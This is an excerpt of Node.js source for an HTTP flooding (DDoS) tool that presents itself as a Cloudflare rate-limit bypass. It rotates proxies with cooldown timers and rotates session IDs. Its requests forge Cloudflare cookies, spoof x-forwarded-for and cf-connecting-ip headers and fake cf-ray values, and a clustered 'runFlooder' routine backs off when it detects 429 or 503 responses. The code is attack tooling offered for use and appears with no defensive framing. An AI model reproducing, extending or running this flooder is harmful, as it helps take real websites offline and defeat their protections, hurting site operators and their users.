...
// ========== CLOUDFLARE RATE LIMIT BYPASS SYSTEM ==========
const RATE_LIMIT_THRESHOLD = 3;
const SESSION_ROTATE_REQUESTS = 35;
const PROXY_COOLDOWN = 45000;
const REQUEST_DELAY_MIN = 25;
const REQUEST_DELAY_MAX = 85;
...
function isProxyOnCooldown(proxy) {
    if (proxyCooldown.has(proxy)) {
        const cooldownUntil = proxyCooldown.get(proxy);
        if (Date.now() < cooldownUntil) {
            return true;
        } else {
            proxyCooldown.delete(proxy);
            proxyFailCount.delete(proxy);
        }
    }
    return false;
}

function markProxyCooldown(proxy) {
    proxyCooldown.set(proxy, Date.now() + PROXY_COOLDOWN);
    const fails = proxyFailCount.get(proxy) || 0;
    proxyFailCount.set(proxy, fails + 1);
}

function getRandomProxyWithCooldown() {
    let attempts = 0;
    const maxAttempts = proxies.length * 2;
    
    while (attempts < maxAttempts) {
        const proxy = randomElement(proxies);
        if (!isProxyOnCooldown(proxy)) {
            return proxy;
        }
        attempts++;
    }
    ...
    if (proxyCooldown.has(firstProxy)) {
        const cooldownTime = proxyCooldown.get(firstProxy) - Date.now();
        if (cooldownTime > 0) {
            Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, cooldownTime);
        }
        proxyCooldown.delete(firstProxy);
        return firstProxy;
    }
...
function getSessionId(proxy) {
    if (!sessionTracker.has(proxy)) {
        sessionTracker.set(proxy, {
            count: 0,
            sessionId: generateRandomString(32, 64)
        });
    }
    const session = sessionTracker.get(proxy);
    session.count++;
    
    if (session.count >= SESSION_ROTATE_REQUESTS) {
        session.sessionId = generateRandomString(32, 64);
        session.count = 0;
    }
...
if (cluster.isMaster) {
    ...
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[32m[CLOUDFLARE BYPASS] Rate Limit Protection ACTIVE\x1b[0m`);
...
function runFlooder() {
    const proxyAddr = getRandomProxyWithCooldown();
    if (!proxyAddr) {
    ...
    let ZynosHeaders = {
      ...
      "cookie": `__cf_bm=${generateRandomString(32, 64)}; _cfuvid=${generateRandomString(32, 64)}; cf_clearance=${generateRandomString(32, 64)}; session=${getSessionId(proxyAddr)}`,
      "x-forwarded-for": ip_spoof(),
      "cf-connecting-ip": ip_spoof(),
      "cf-ray": `${generateRandomString(16, 20)}-${randomElement(['LHR', 'CDG', 'FRA', 'JFK', 'LAX', 'SYD', 'NRT', 'SIN'])}`,
      "cf-visitor": `{"scheme":"https"}`,
      "cdn-loop": "cloudflare",
      "x-request-id": generateRandomString(32, 64)
    };
                        ...
                        setTimeout(() => {
                            ...
                            try {
                                ...
                                req.on('response', (headers) => {
                                    // Detect Cloudflare rate limit response
                                    if (headers['cf-ray'] && (headers[':status'] === 429 || headers[':status'] === 503)) {
                                        markProxyCooldown(proxyAddr);
                                    }
                                    req.close();
                                    req.destroy();
